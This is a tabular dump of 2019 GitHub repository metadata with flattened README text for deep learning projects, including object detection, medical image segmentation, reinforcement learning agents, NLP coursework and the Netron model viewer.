build the computational model by constructing the blocks Deep Learning for Computer Vision Layered Software Design Object Detection Framework,2019-08-07T12:09:53Z,2019-11-03T15:52:08Z,C++,ZekiFayes,User,1,2,0,98,master,ZekiFayes,1,0,0,0,0,0,0
Vic-TheGreat,Object-Detection-using-deep-learning-YOLO-Tensorflow-etc-Presentation,n/a,Object Detection using deep learning YOLO Tensorflow etc Presentation A detailed Presentation on Object Detection using deep learning models for example YOLO Tensorflow etc This was a presenation done in July 2019 at Institut de Recherche en Informatique de Toulouse IRIT research lab in Toulouse France titled DETECTION OF THE TYPES OF IMAGES PHOTOS VIDEOS PUBLISHED BY POLITICAL PAGES ON FACEBOOK The objective of the presentation was to share insights on object detection via deep learning using neural networks previous state of the art researches done show case some of the results tested on an in house corpus of political images found on social media like Facebook twitter etc Some open questions were discussed at the end Feel free to join the conversation Cheers Victoria,2019-08-11T15:58:42Z,2019-10-29T02:00:21Z,n/a,Vic-TheGreat,User,1,2,0,2,master,Vic-TheGreat,1,0,0,0,0,0,0
crrnnn,CM2003_Deep_Learning_Methods_for_Medical_Image_Analysis,n/a,CM2003DeepLearningMethodsforMedicalImageAnalysis,2019-09-03T09:00:56Z,2019-09-09T14:11:58Z,n/a,crrnnn,User,2,2,0,1,master,crrnnn,1,0,0,0,0,0,0
Mateus224,Visual-Explanation-in-Deep-Reinforcement-Learning-through-Backpropagation,n/a,Visual Explanation in Deep Reinforcement Learning through Guided Backpropagation and GradCam This is the first algorithm which visualizes the knowledge of an agent trained by Deep Reinforcement Learning paper will be published in Februar using backpropagation It shows why the agent is performing the action Which pixels had the biggest influence on the decision of the agent Deep Reinfocement Learning Algorithms off Policy algorithms X DQN x DDQN x Dueling DDQN LSTM DQN Bidirectional LSTM DQN Attention LSTM DQN on Policy algorithms Policy Gradient A3C Visualization Techniques X Backpropagation x Guided Backpropagation GradCam Guided GradCam SmoothGrad Perturbation based Saliency Map For now we will compare how good we can visualize DQN and dueling double DQN Algorithms As environment we will use ATARI Game and later Doom If you have a trained dueling agent and you want visualize what he learned run console python3 main py testdqn gbp dueling True ddqn True testdqnmodelpath saveddqnnetworks XXXX h5 otherwise train you agent with console python3 main py traindqn dueling True ddqn True and you can test how the agent plays with console python3 main py testdqn dorender dueling True ddqn True testdqnmodelpath saveddqnnetworks XXXX h5 Alt text pictures DuelingNet png raw true DQN vs Dueling DQN Network some results Here we can see how the agent is looking more on his position in the advantage part of the neuronal network right figure and how he is looking more on the reward in the value function part of the network left figure left value right advantage Alt text pictures 4 png raw true example with environment Alt text pictures 1 png raw true example 1 Alt text pictures 2 png raw true example 2 For Attention Networks Visualization is not working yet train console python3 dqnatari py netmode duel ddqn numframes 10 nomonitor selector bidir recurrent at selector taskname SpatialAtDQN seed 36 env SeaquestDeterministic v0 test console python3 dqnatari py netmode duel ddqn numframes 10 recurrent at bidir selector taskname SpatialAtDQN test loadnetwork test loadnetworkpath log SeaquestDeterministic v0 run6 SpatialAtDQN qnet7628 h5 env SeaquestDeterministic v0,2019-08-19T13:06:43Z,2019-12-11T19:42:05Z,Python,Mateus224,User,1,2,0,23,master,Mateus224,1,0,0,0,0,0,0
Franceshe,cs224n_W2019_NLPwithDeepLearning,n/a,cs224nW2019NLPwithDeepLearning It includes all lab assignment required in CS224 Winter 2019 Stanford NLP Course In addition I have a personal project based on the guidance provided Personal Project Pratical tips for Personal http web stanford edu class cs224n readings final project practical tips pdf Some pratical tips for future NLP realated side projects reading x CS231n notes on backprop Some useful reference CS224 HOME http web stanford edu class cs224n index html schedule Homepage for CS224N CS124 From Language to Information http web stanford edu class cs124 A great course by Dan Jurafsky It is mainly about extracting meaning information and structure from human language text speech web pages genome sequences social networks or any less structured information Methods include string algorithms edit distance language modeling naive Bayes inverted indices vector semantics Applications such as information retrieval question answering text classification social network models chatbots genomic sequence alignment word meaning extraction recommender systems Open Source NLP algorithm package stanfordNLP NLTK Apache OpenNL Kaldi HTKHTS Hadoop Mahout word2vec Application for NLP tasks word segmentation POS tagging named entity recognition knowledge graph text classification information extraction keyword tagging automatic summarization Neural Network models for NLP LSTM CNN RNN seq2seq BERT Chinese NLP package Jieba https github com fxsjy jieba Jieba Algorithm Based on a prefix dictionary structure to achieve efficient word graph scanning Build a directed acyclic graph DAG for all possible word combinations Use dynamic programming to find the most probable combination based on the word frequency For unknown words a HMM based model is used with the Viterbi algorithm Useful Text for NLP Speech and Language Processing 3rd ed draft BY Dan Jurafsky and James H Martin https web stanford edu jurafsky slp3 Great Text Writing Code for NLP Research from Allen Institute https www 080910t com downloads Writing 20Code 20for 20NLP 20Research pdf,2019-08-21T04:22:54Z,2019-12-09T18:39:53Z,JavaScript,Franceshe,User,1,2,0,19,master,Franceshe,1,0,0,0,0,0,0
gingerbig,wordnet,deep-learning#machin,WordNet A Toy Example for Deep Learning This project is based on the second programming assignment of Hinton s Coursera course Neural Networks for Machine Learning https www coursera org learn neural networks home welcome The original code is written in MATLAB Octave Since I find this example elegent for showing how deep learning works I rewrite the code with C from scratch and call it WordNet without Hinton s permission For such a teaching purpose the code doesn t have a GPU mode or a good performance in terms of memory or CPU usage and currently I have no plan for optimization Basically WordNet reads three consecutive words and predict the fourth word The layout of WordNet is defined as Layout of WordNet https github com gingerbig wordnet blob master pics layout png Layout of WordNet For more technical details please read Slides pdf Building the project is quite simple since it only relies on the standard C libs If your building tool chain is properly configured you may simply modify the following lines in src makefile with your compiler and header include path makefile CC clang INCLUDES I usr local opt llvm include c v1 I Applications Xcode app Contents Developer Platforms MacOSX platform Developer SDKs MacOSX sdk usr include and type shell make forward load model9 3000 bin to interact with a console UI doing inference with the pre trained model model9 3000 bin If everything goes well you ll see make forward load model9 3000 bin wordnet forward model9 3000 bin Load all data Load model model9 3000 bin Model Info Mini batch size 100 Layer 1 Neurons 50 Layer 2 Neurons 200 Training epochs 9 Early stop iteration 3000 Momentum 0 900000 Learning rate 0 100000 Verify per iteration 2147483647 Raw training data rows 372550 Raw validation data rows 46568 Raw test data rows 46568 Raw data columns 4 Input dimension 3 Vocabulary size 250 Interactive UI here lists the vocabulary Input first 3 words have a good have a good Top 5 1 time 0 332076 2 day 0 102091 3 game 0 059815 4 team 0 057552 5 year 0 041762 Choose a number default 1 Of course this project also covers codes for training shell Usage wordnet info model bin Show info of pretrained model wordnet train model bin Train from scratch and save model wordnet train pretrain bin model bin Read pretrained data finetune it save model wordnet forward pretrain bin Read pretrained data and do inferences Or make info load model bin make train save model bin make train load pretrain bin save model bin make forward load pretrain bin Enjoy,2019-08-11T16:38:37Z,2019-10-31T05:47:35Z,C,gingerbig,User,1,2,0,4,master,gingerbig,1,0,0,0,0,0,0
pythox,Feature-Fonts,convolutional-neural-networks#fonts,To Install Dependencies pip install requirements txt,2019-09-04T16:59:58Z,2019-11-27T18:14:51Z,Python,pythox,User,1,2,0,16,master,pythox,1,0,0,0,0,0,0
nghorbani,ccpcm,n/a,Cross Category Product Choice Model A PyTorch implementation for the paper Cross Category Product Choice A Scalable Deep Learning Model https papers ssrn com sol3 papers cfm abstractid 3402471 Install bash pip install git https github com nghorbani ccpcm or inside the ccpcm root directory run bash python setup py develop build Train First you need to prepare the training data by running the script ccpcm data preparedata py It assumes that the data containing files predictionexample csv promotionschedule csv train csv are present in the ccpcm data dataset folder The script will output the necessary PyTorch pt files in the ccpcm data dataset directory Edit the ccpcm train ccpcmmodel py to point to the right dataset dir and change the hyperparameters to your desire Afterward you can run the training code from the ccpcm train directory to make the experiment bash python m ccpcmmodel py Evaluate Given that you have the experiments folder inside the ccmpm directory simply edit ccpcm eval eval ccpcm py to point to the experiemnt id that you want to evaluate and run the following command from eval directory e g ccpcm eval eval bash python m evalccpcm Found CCPCM Trained Model experiments 10 snapshots TR00E057 pt Model Found experiments 10 snapshots TR00E057 pt Running on dataset data dataset TRAIN train dataset size 70200 BCE 8 37e 02 AUC 0 0 55 1 0 62 2 0 59 3 0 59 4 0 54 5 0 68 6 0 64 7 0 60 8 0 53 9 0 53 10 0 53 11 0 53 12 0 51 13 0 53 14 0 53 15 0 63 16 0 57 17 0 53 18 0 49 19 0 47 20 0 50 21 0 54 22 0 54 23 0 52 24 0 56 25 0 54 26 0 53 27 0 55 28 0 52 29 0 49 30 0 70 31 0 47 32 0 51 33 0 68 34 0 61 35 0 53 36 0 55 37 0 50 38 0 49 39 0 72 VALD vald dataset size 7800 BCE 8 37e 02 AUC 0 0 61 1 0 63 2 0 60 3 0 61 4 0 41 5 0 68 6 0 65 7 0 54 8 0 53 9 0 47 10 0 56 11 0 52 12 0 55 13 0 57 14 0 54 15 0 64 16 0 58 17 0 57 18 0 56 19 0 39 20 0 31 21 0 56 22 0 48 23 0 68 24 0 56 25 0 47 26 0 50 27 0 44 28 0 53 29 0 47 30 0 70 31 0 53 32 0 48 33 0 68 34 0 64 35 0 48 36 0 50 37 0 51 38 0 42 39 0 71,2019-09-01T12:31:17Z,2019-09-24T18:47:49Z,Python,nghorbani,User,1,2,1,1,master,nghorbani,1,0,0,0,0,0,0
bominn,DLCV2019SPRING,computer-vision#deep-learning#ntu,DLCV2019SPRING This course is Deep Learning Computer Vision from University Department of Electrical Engineering 2019 spring course website http vllab ee ntu edu tw dlcv html,2019-08-20T11:59:54Z,2019-11-25T11:09:00Z,Python,bominn,User,1,2,0,10,master,bominn,1,0,0,0,0,0,0
Huzmorgoth,BitcoinTradingBot,n/a,BitcoinTradingBot BTC Trading Bot Development Used Open AI Gym and Deep Reinforcement Learning Proximal Policy Optimization from stablebaseline Run BTCBot py FYI the same code can also be used for other Cryptocurrencies just modify the Environment py and BTCGraph py according to the dataset Source https towardsdatascience com creating bitcoin trading bots that dont lose money 2e7165fb0b29 Educational Purposes Only,2019-08-10T13:20:38Z,2019-10-09T08:22:15Z,Python,Huzmorgoth,User,2,2,0,6,master,Huzmorgoth,1,0,0,0,0,0,0
tau-adl,Balloons_vs_Sky,n/a,Real Time Balloons detection in Videos Using Deep Learning Deep learning was able to produce significant breakthrough in the field of computer vision in recent years This along with the advances in hardware for deep learning allows for running real time object detection from video on hardware mounted on a small drone In this project I created an environment setup for training deep neural networks and utilized it to train a neural network to detect balloons from a video In addition the balloons detection was optimized to run at real time on the Nvidia Jetson TX2 General description of project structure The videos for training are available under datasets balloonsvsskybasic train The video for testing is available under datasets balloonsvsskybasic testing Project should be run from the projects main directory Config file is located under config directory All the source files are located under src directory Any script can be run with the h flag to display help messages Images generation from videos for training To generate images from videos for training the following command should be executed python cropballoonsfromvideo py input Example python cropballoonsfromvideo py input datasets balloonsvsskybasic train 20190320162139 mp4 Elaboration on how to use the cropping tool A crop is selected with the mouse left button The following keypads control the cropping o Optimize the cropping region s Choose another sky ROI d Start fast cropping r Reset the cropping region q Quit sky ROI When the script is in automatic mode balloons and sky images will be generated automatically When the script is in manual mode 5 Continue to next frame 8 Move rectangle up 2 Move rectangle down 4 Move rectangle left 6 Move rectangle right s Choose another sky ROI q Quit sky ROI HDF5 files creation To build the HDF5 files the following command should be executed python buildballoonsvssky py Training To train a CNN on the dataset the following command should be executed python trainballoonsvssky py net optimizer Example python trainballoonsvssky py net NanoVggNet optimizer SGD epochs 10 learningrate 1e 2 Evaluation To evaluate a trained CNN on the dataset the following command should be executed python evalballoonsvssky py model Example python evalballoonsvssky py model output balloonsvsskybasic checkpoints NanoVggNetballoonsvsskybasicepoch10 hdf5 Detection To run the balloons detection the following command should be executed python detectballoons py input model Example for running the detection on an input video python detectballoons py input datasets balloonsvsskybasic test VID20190320162218 mp4 model output balloonsvsskybasic checkpoints NanoVggNetballoonsvsskybasicepoch10 hdf5 Example for running the detection on an input folder of images python detectballoons py input datasets balloonsvsskybasic test VID20190320162218 model output balloonsvsskybasic checkpoints NanoVggNetballoonsvsskybasicepoch10 hdf5 Additional scripts To split a video into a folder of images the following command should be executed python splitvideo py input Example python splitvideo py input datasets balloonsvssky test VID20190320162218 mp4 To display the content of the HDF5 files the following command should be executed python showhdf5 py path Example python showhdf5 py path datasets balloonsvsskybasic hdf5 Versions Python 3 6 3 Keras 2 2 4,2019-09-15T08:47:48Z,2019-10-28T13:02:19Z,Python,tau-adl,Organization,1,2,1,67,master,RomanBuda#mandelyoni,2,0,0,0,0,0,0
lperez31,prime-select-hybrid,n/a,prime select for deep learning users on hybrid laptops What is it A modified version of prime select It adds an hybrid profile in which the Nvidia GPU is available for tensorflow or pytorch while the graphics remain on Intel GPU It works on Ubuntu 18 04 Installation Make your installation work with the standard version of prime select install cuda drivers tensorflow etc Replace usr bin prime select by the version of this repo Usage To switch to the hybrid profile sudo prime select hybrid Other options remain similar to standard prime select command prime select nvidia intel hybrid query nvidia switches to NVIDIA s version of libGL so intel switches to the open source version of libGL so hybrid use intel GPU for display and enables nvidia driver for tensorflow or pytorch query checks which version is currently active and writes nvidia intel hybrid or unknown to the standard output,2019-08-24T07:50:56Z,2019-11-27T19:34:06Z,Python,lperez31,User,2,2,0,3,master,lperez31,1,0,0,0,0,0,0
habbes,serengeti,n/a,Serengeti Explorer Explore Snapshot Serengeti dataset Deep Learning Indaba 2019 Hackathon https serengeti explorer web app Installation Clone repo Start a mongodb server Install dependencies npm install Import data npm run import This imports the data in data data json into the mongodb serengeti database in a collection called events You can override the default mongodb database and url by setting the MONGODBURI env variable Scripts npm run import imports the data from data npm start starts the server on port 3000 npm run client dev starts client server on port 1234 watches for changes npm run client build builds client bundle npm run deploy deploys server to heroku and client to firebase hosting,2019-08-29T19:36:30Z,2019-10-25T19:37:46Z,JavaScript,habbes,User,1,2,0,23,master,habbes,1,0,0,0,0,0,0
lollcat,RL-Process-Design,n/a,Deep Reinforcement Learning for Design Synthesis of Chemical Engineering Processes Final year chemical engineering thesis by Laurence Midgley and Michael Thomson See Report pdf for details DOI 10 5281 zenodo 3556549 To cite this thesis please use misclaurencemidgley20193556549 author Laurence Midgley and Michael Thomson title Reinforcement learning for chemical engineering process synthesis month nov year 2019 note Final year undergraduate chemical engineering thesis publisher Zenodo version v1 0 doi 10 5281 zenodo 3556549 url https doi org 10 5281 zenodo 3556549,2019-09-08T10:38:38Z,2019-11-28T15:26:56Z,Jupyter Notebook,lollcat,User,1,2,0,177,master,lollcat,1,1,1,0,0,0,13
RL-Robot,rl-test,n/a,rl test Build a Deep Q Learning AI to play CartPole v0 Contributers andrewlo8552,2019-08-28T09:14:39Z,2019-09-16T13:48:43Z,n/a,RL-Robot,Organization,3,2,0,5,master,md-david#andrewlo8552,2,0,0,1,1,1,0
ThomasT3563,MedicalSegmentation,n/a,MedicalSegmentation Project realised during a 6 months internship at IUCT Oncopole France This provides some deep Learning tools for automatic segmentation of medical images The approach implemented for this project is to process the entire medical acquisition at the same time One of the major challenges when processing this kind of data using deep learning algorithms is the memory usage as depending on the modality and the study an imaging serie can contains several hundreds or thousands of images Model The model used during this project is a custom U Net 1 adapted to handle 3D medical images reduce overfitting and limit the RAM comsumption The model V Net 2 is also implemented but couldn t be used as it is more elaborate and requires more RAM which wasn t possible 1 O Ronneberger P Fischer and T Brox U Net Convolutional Networks for Biomedical Image Segmentation arXiv 1505 04597 cs May 2015 2 F Milletari N Navab and S A Ahmadi V Net Fully Convolutional Neural Networks for Volumetric Medical Image Segmentation arXiv 1606 04797 cs Jun 2016 Applications Results Tissue segmentation of CT scan in 5 classes Background Fat Soft tissues Lungs Bones results no signs of overfitting visually correct median DSC 0 9 Physiologic segmentation of IRM in 9 classes N A Spleen Liver 6 lymphatic nodes results signs of overfitting visually correct on Liver and Spleen wrong for lymphatic nodes median DSC 0 4 Tumour segmentation of PET scan results signs of slight overfitting visually acceptable median DSC 0 65 Tumour segmentation of PET CT scan results no signs of overfitting visually correct median DSC 0 74 Segmentation of tumour on PET CT scan Trained model available master deeplearningmodels trainedmodel09241142 h5 Development progress DONE modality PET CT available master classmodalities modalityPETCT py ONGOING fix image shifting between PET and CT TODO add modality CT add modality IRM add modality PET,2019-09-19T16:57:05Z,2019-11-26T14:33:17Z,Python,ThomasT3563,User,2,2,1,33,master,ThomasT3563,1,0,0,0,0,0,2
Sunbaoli,DSR,n/a,Depth Super Resolution based on Deep Edge Aware Learning This repo implements the training and testing of depth upsampling networks for Depth Super Resolution based on Deep Edge Awar Learning by Xinchen Ye Baoli Sun and et al at DLUT The proposed edge guided depth super resolution framework https github com Sunbaoli DSR blob master code fig2 png Results https github com Sunbaoli DSR blob master code fig1 png This repo can be used for training and testing of depth upsampling under noiseless and noisy cases for Middleburry datasets Some trained models are given to facilitate simple testings before getting to know the code in detail Besides the results of our inferred edge maps recovered depth maps under both noiseless and noisy cases are all given to make it easy to compare with and reference our work Dependences matlab r2017a matconvnet 1 0 beta25 Train run starttrain m Training on Middlebury noisy depth maps you can use the following code to preproccess training data imdepth imnoise imdepth gaussian 0 5 255 2 noisydepth imdepth Test run testclassSR m Citation If you find this code useful please cite Xinchen Ye et al Depth Super Resolution based on Deep Edge Aware Learning Submitted to Pattern Recognition Major revision,2019-09-04T02:41:01Z,2019-09-11T12:08:43Z,MATLAB,Sunbaoli,User,1,2,0,26,master,Sunbaoli,1,0,0,0,0,0,0
Sharan-Sundar,Ubuntu_Init,n/a,UbuntuInit Shell scripts to install basic deep learning frameworks and packages,2019-08-31T14:46:21Z,2019-08-31T22:23:35Z,Shell,Sharan-Sundar,User,1,2,0,2,master,Sharan-Sundar,1,0,0,0,0,0,0
CaelynCheung1996,Chest-Radiographs-Preprocessing,n/a,Chest Radiograph Pre processing Pre processing pipeline for ICU chest radiographs for further machine learning and deep learning related applications The pre processing pipeline includes Otsu thresholding binarization Select adaptive bounding box to include the main part of the chest radiographs Resize image to 2048 2048 Apply Sauvola filter to recognize the annotation label on the image and blur the text with median filter Contrast limited adaptive histogram equalization Anisotropic denoising,2019-09-06T19:00:42Z,2019-10-02T22:03:15Z,Python,CaelynCheung1996,User,1,2,0,8,master,CaelynCheung1996,1,0,0,0,0,0,0
wyfish,netron,n/a,Netron is a viewer for neural network deep learning and machine learning models Netron supports ONNX onnx pb pbtxt Keras h5 keras Core ML mlmodel Caffe caffemodel prototxt Caffe2 predictnet pb predictnet pbtxt MXNet model symbol json TorchScript pt pth NCNN param and TensorFlow Lite tflite Netron has experimental support for PyTorch pt pth Torch t7 CNTK model cntk Deeplearning4j zip PaddlePaddle zip model Darknet cfg scikit learn pkl TensorFlow js model json pb and TensorFlow pb meta pbtxt Install macOS Download https github com lutzroeder netron releases latest the dmg file or run brew cask install netron Linux Download https github com lutzroeder netron releases latest the AppImage or deb file Windows Download https github com lutzroeder netron releases latest the exe installer Browser Start https www lutzroeder com ai netron the browser version Python Server Run pip install netron and netron FILE or import netron netron start FILE Download Models Sample model files to download and open ONNX resnet 18 https s3 amazonaws com onnx model zoo resnet resnet18v1 resnet18v1 onnx Keras tiny yolo voc https github com hollance YOLO CoreML MPSNNGraph raw master Convert yad2k modeldata tiny yolo voc h5 CoreML facesmodel https github com NovaTecConsulting FaceRecognition in ARKit files 1526806 facesmodel mlmodel zip TensorFlow Lite smartreply https storage googleapis com download tensorflow org models tflite smartreply1 020171101 zip MXNet inceptionv1 https s3 amazonaws com model server models onnx inceptionv1 inceptionv1 model Caffe mobilenetv2 https raw githubusercontent com shicai MobileNet Caffe master mobilenetv2 caffemodel TensorFlow inceptionv3 https storage googleapis com download tensorflow org models inceptionv320160828frozen pb tar gz,2019-08-27T02:12:49Z,2019-10-26T03:04:43Z,JavaScript,wyfish,User,2,2,0,1989,master,lutzroeder,1,0,2,0,0,0,0
smlra-kjsce,ML-DL101,cnn#colab#decision-trees#deep-learning#linear-regression#logistic-regression#machine-learning#multilayer-perceptron#pytorch-tutorial#svm-classifier,ML DL101 Repository of all notebooks used in ML DL101 event for explaining basics of machine learning and deep learning Some points to note on how to use this repository 1 Kindly open the notebooks in Colab using the Open in Colab button on each notebook 2 Experiment with the code by changing hyperparameters epochs learning rate etc If you face any abnormal outputs feel free to ping us 3 Kindly do the TODOs mentioned in certain notebook to explore more algorithms Any doubts feel free to ask your queries especially those who couldn t attend Cheers SMLRA Made by Nikhil Bhardwaj https www github com nik9hil Jasdeep Singh Grover https www github com jasdeep100 and Arghyadeep Das https www github com arghyadeep99,2019-09-07T15:44:43Z,2019-10-18T05:26:03Z,Jupyter Notebook,smlra-kjsce,Organization,0,2,1,13,master,arghyadeep99,1,0,0,0,0,0,0
microsoft,multilabel-audio-retrieval,n/a,Contributing This project welcomes contributions and suggestions Most contributions require you to agree to a Contributor License Agreement CLA declaring that you have the right to and actually do grant us the rights to use your contribution For details visit https cla opensource microsoft com When you submit a pull request a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately e g status check comment Simply follow the instructions provided by the bot You will only need to do this once across all repos using our CLA This project has adopted the Microsoft Open Source Code of Conduct https opensource microsoft com codeofconduct For more information see the Code of Conduct FAQ https opensource microsoft com codeofconduct faq or contact opencode microsoft com mailto opencode microsoft com with any additional questions or comments,2019-08-23T00:51:57Z,2019-10-08T14:41:09Z,Jupyter Notebook,microsoft,Organization,4,2,0,6,master,microsoftopensource#msftgits#fanjian0803,3,0,0,0,0,0,0
arminsadreddin,CartPole-DQN,cartpole#deep-q-learning#dqn#openai-gym#using,CartPole DQN This is a solution for CartPole game using deep Q learning and Openai gym library The included model never lose at all just load it and have fun,2019-08-17T23:12:15Z,2019-11-23T11:39:36Z,Python,arminsadreddin,User,1,2,0,1,master,arminsadreddin,1,0,0,0,0,0,0
uchendui,maml,n/a,maml Implementation of Model Agnostic Meta Learning for Fast Adaptation of Deep Networks Finn et al,2019-08-14T22:29:25Z,2019-09-28T19:13:39Z,Jupyter Notebook,uchendui,User,1,2,0,3,master,uchendui,1,0,0,1,0,0,0
Not-IITian,SURFMNet--,n/a,SURFMNet This is a follow up work of our ICCV 19 oral presentation Source code for ICCV 19 oral Unsupervised Deep Learning for Structured Shape Matching can be found at https github com LIX shape analysis SURFMNet,2019-08-14T16:58:16Z,2019-11-18T14:56:58Z,n/a,Not-IITian,User,1,2,0,7,master,Not-IITian,1,0,0,0,0,0,0
TrasperJ,102-flowers-classfication-with-PyTorch,n/a,102 flowers classfication with PyTorch A detailed step by step walk through for PyTorch based computer vision deep learning beginners What is this project Using the 102 flowers dataset provided in the project to perform simple image classification with pre trained VGG19 backbone Here we follow a Transfer Learning philospohy to solve the 102 classes classification problem where an ImageNet pre trained VGG19 feature extraction head is directly utilized without fine tuning A new classifier head is trained with the 102 flowers dataset Major components to realize such a classification task including network training Validation Testing Checkpointing Predicting with single new images as well as image pre processing displaying are separately coded into self contained functions aiming to provide better re usability Why go through this project This is a tutorial like project which is deliberatively practiced for beginners to follow Details info to use this repo Using PyTorch 0 4 1 Python3 7 Cuda9 0 With specific cpu gpu switch utils 102 flowers dataset can be downloaded from https www kaggle com wassimseifeddine 102flowersdataset downloads 102flowersdataset zip 1 once downloaded unzip into your project directory and making sure it is named as flowers Going into flowers it should contains the train valid test subdirectories Keep them unchanged traineval test predict chkptsave load and imagepreprossess functionaliteis are wrapped in functions for easy reuse Offers a Jupyter Notebook version and a py plain file version Additional handbook of tips A self collected tips for obsolute new comers to Jupyter notebook which have made my life easier when I first started A self collected tips for obsolute new comers to Linux OS PyTorch Still in progress accmulating tips that have really helped me,2019-08-18T09:25:41Z,2019-08-19T01:44:38Z,Jupyter Notebook,TrasperJ,User,1,2,0,51,master,TrasperJ,1,0,0,0,0,0,0
liyues,PatRecon,n/a,Patient specific reconstruction of volumetric computed tomography images from few view projections via deep learning Contents Overview overview Repo Contents repo contents System Requirements system requirements Installation Guide installation guide Instructions for Use instructions for use License LICENSE Citation citation 1 Overview This project provides a deep learning framework for generating volumetric tomographic X ray images with ultra sparse 2D projections as input Using the code requires users to have basic knowledge about python PyTorch and deep neural networks 2 Repo Contents test py test py main code to run evaluation net py net py network definition of proposed framework exp model model pth tar exp model model pth tar trained model for running experiment exp data 2Dprojection jpg exp data 2Dprojection jpg 2D projection of the data sample which is the input of model exp data 3DCT jpg exp data 3DCT bin 3D CT volume of the data sample which will be used as groundtruth to compare with the output prediction results exp result exp result output folder to save the model prediction as png files Please put the trained model and data sample under exp folder as above to run the code 3 System Requirements Hardware Requirements Loading and running deep network requires a standard computer with enough memory to support the model defined by a user For optimal performance a GPU card can largely accelerate computation In our experiment we use a NVIDIA Tesla V100 GPU card with about 32 GB of memory we recommend a computer with the following specs RAM 16 GB CPU 4 cores 3 3 GHz core The runtimes below are generated using a computer with a NVIDIA Tesla V100 GPU OS Requirements This package is supported for Linux operating systems The package has been tested on the following systems Linux Ubuntu 16 04 4 Installation Guide Before running this package users should have Python PyTorch and several python packages numpy sklearn skimage PIL and matplotlib installed Installing Python version 3 5 5 on Ubuntu 16 04 The Python can be installed in Linux by running following command from terminal sudo apt get update sudo apt get install python3 5 which should install in about 30 seconds Package Versions This code functions with following dependency packages The versions of software are specifically pytorch 0 4 1 numpy 1 15 0 sklearn 0 19 1 skimage 0 14 0 PIL 5 1 0 matplotlib 2 2 2 Package Installment Users should install all the required packages shown above prior to running the algorithm Most packages can be installed by running following command in terminal on Linux To install of PyTorch please refer to their official website https pytorch org pip install package name which will install in about 30 mins on a recommended machine 5 Instructions for Use To running the trained model to evaluate reconstruction performance on data samples please type in following comman in terminal Parameter exp is used to run different experiments Running a model inference on one data sample should take approximately 2 mins using a computer with a NVIDIA Tesla V100 GPU Running Experiment Please use the parameter visplane to get output image slices on different planes of 3D pancreas CT The prediction results are saved under path exp testresults sample1 The results contains png files which are named after Plane 0 1 2 ImageSlice png Each file shows the prediction ground truth and difference image for one slice along the chosen plane Specifically the following commands could be run in terminal to get model results and visualize based on three different planes 0 axial 1 sagittal 2 coronal of 3D pancreas CT python3 test py visplane 0 python3 test py visplane 1 python3 test py visplane 2 6 License A provisional patent application for the reported work has been filed The codes are copyrighted by Stanford University and are for research only Correspondence should be addressed to the corresponding author in the paper Licensing of the reported technique and codes is managed by the Office of Technology Licensing OTL of Stanford University Ref Docket S18 464 7 Citation If you find the code are useful please cite the paper articleshen2019PatRecon title Patient specific reconstruction of volumetric computed tomography images from a single projection view via deep learning author Shen Liyue and Zhao Wei and Xing Lei,2019-09-02T03:23:03Z,2019-11-21T23:18:03Z,Python,liyues,User,1,2,1,0,master,,0,0,0,0,0,0,0
Ayat-Abedalla,MTRecS-DLT,n/a,MTRecS DLT Multi Modal Transport Recommender System using Deep Learning and Tree Models By Ayat Abedalla https github com Ayat Abedalla Ali Fadel https github com AliOsm Ibraheem Tuffaha https github com IbraheemTuffaha Hani Al Omari https github com HaniAl Omari Mohammad Omari https github com KasperOmari Data Science Malak Abdullah https github com justMLK and Mahmoud Al Ayyoub https github com malayyoub Multi modal transport recommender systems aim to recommend the most appropriate transport mode for a given Origin Destination pair OD and the situational context to take into account different user preferences The model is based on the weighted average ensemble of Convolutional Neural Network CNN and Gradient Boosted Decision Trees GBDT We have extracted context and user features from the data and then fed the features into the CNN and GBDT models to predict the most appropriate transport mode Finally we combine the prediction of each model by the weighted average ensembling technique Dataset We have used KDD Cup 2019 https dianshi baidu com competition 29 question dataset for the analysis of the proposed methodology It consists of historical user behavior data collected from Baidu Maps http www baidu com application and a set of user attributes data capture user interactions with navigation applications Feature Engineering User features Applying Singular Value Decomposition SVD https scikit learn org stable modules generated sklearn decomposition TruncatedSVD html to obtain a compact dense vector representation of user profile features due to its sparsity Context features Extract 37 different context features from the historical user behavior data and then scaling them using the MinMaxScaler https scikit learn org stable modules generated sklearn preprocessing MinMaxScaler html Model MTRecS DLT Model architecture Performance Evaluation metric is a weighted F1 score F1 score for each class is defined as The weighted F1 is calculated by considering the weight of each class Results Weighted F1 score on validation dataset is 0 67500855 Weighted F1 score on test dataset is 0 68898702 Licence This project is licensed under the MIT LICENSE,2019-09-01T21:22:36Z,2019-11-15T00:50:32Z,Python,Ayat-Abedalla,User,1,2,0,26,master,Ayat-Abedalla,1,0,0,0,0,0,1
anand498,Face-Liveness-Detection,n/a,Face Liveness Detection using Depth Map Prediction About the Project This is an application of a combination of Convolutional Neural Networks and Computer Vision to detect between actual faces and fake faces in realtime environment The image frame captured from webcam is passed over a pre trained model This model is trained on the depth map of images in the dataset The depth map generation have been developed from a different CNN model Project under continous development Requirements Python3 Tensorflow dlib numpy Imutils OpenCV cv for python3 File Description facepredictor py https github com anand498 Face Liveness Detection blob master facepredictor py This file is the main script that would capture the faces and process them before loading it into the model for prediction The user needs to ensure that the face should be within the designated frame training py https github com anand498 Face Liveness Detection blob master training py Along with the architecture script this file includes various parameter tuning steps of the model eyeaspectratio py https github com anand498 Face Liveness Detection blob master eyeaspectratio py This is an optional script if one needs to add multiple checks like blinking of the eye for the liveness of the video feed architecture py https github com anand498 Face Liveness Detection blob master architecture py Has the main CNN architecture for training the dataset The Concolutional Neural Network The network consists of 3 hidden conlvolutional layers with relu as the activation function Finally it has 1 fully connected layer The network is trained with 10 epochs size with batch size 32 The ratio of training to testing bifuracation is 75 25 How to use it in real time Clone the complete directory facepredictor py https github com anand498 Face Liveness Detection blob master facepredictor py Run this file after making the changes in the path of the pre trained model Future Work The whole project is based on the dataset that uses an image dataset that uses faces and the rest of environment behing it That brings a lot of factors and elements into consideration for prediction In the next version of this directory I will make a model that is only trained on the face features of the test image by cropping the rest of the enivronment Will keep updating the repo Stay Tuned,2019-08-10T13:28:40Z,2019-12-08T15:14:01Z,Python,anand498,User,1,2,0,29,master,anand498,1,0,0,0,1,0,0
